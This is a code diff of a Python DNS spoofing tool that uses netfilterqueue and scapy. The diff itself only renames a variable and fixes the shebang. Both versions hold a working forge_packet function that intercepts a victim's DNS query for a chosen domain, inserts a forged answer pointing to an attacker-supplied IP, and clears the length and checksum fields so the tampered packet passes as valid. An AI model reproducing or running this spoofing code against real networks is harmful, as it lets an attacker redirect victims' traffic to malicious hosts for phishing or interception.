@@ -1,4 +1,4 @@
-#! /usr/bin/env python3
+#!/usr/bin/env python3
 
 import netfilterqueue
 import scapy.all as scapy
@@ -25,26 +25,26 @@ def get_args():
     return values
 
 
-def forge_packet(scapy_packet):
+def forge_packet(packet):
     # Get the DNS Query name from the scapy packet.
     # Query name is the host name sent by the victim to the DNS server.
-    qname = scapy_packet[scapy.DNSQR].qname
+    qname = packet[scapy.DNSQR].qname
     # If the query name is our target domain,
     # modify the DNS sent IP address with IP address in arguments.
     if options.domain + "." == qname.decode():
         print("[+] Spoofing Target")
         answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
-        scapy_packet[scapy.DNS].an = answer
+        packet[scapy.DNS].an = answer
         # Modify the packet ancount with 1,
         # Send a single DNSRR to the victim.
-        scapy_packet[scapy.DNS].ancount = 1
+        packet[scapy.DNS].ancount = 1
         # Packet corruption can be detected using the checksum and
         # len fields. By deleting these scapy generates new entries.
-        del scapy_packet[scapy.IP].len
-        del scapy_packet[scapy.IP].chksum
-        del scapy_packet[scapy.UDP].chksum
-        del scapy_packet[scapy.UDP].len
-    return scapy_packet
+        del packet[scapy.IP].len
+        del packet[scapy.IP].chksum
+        del packet[scapy.UDP].chksum
+        del packet[scapy.UDP].len
+    return packet
 
 
 def process_packet(packet):
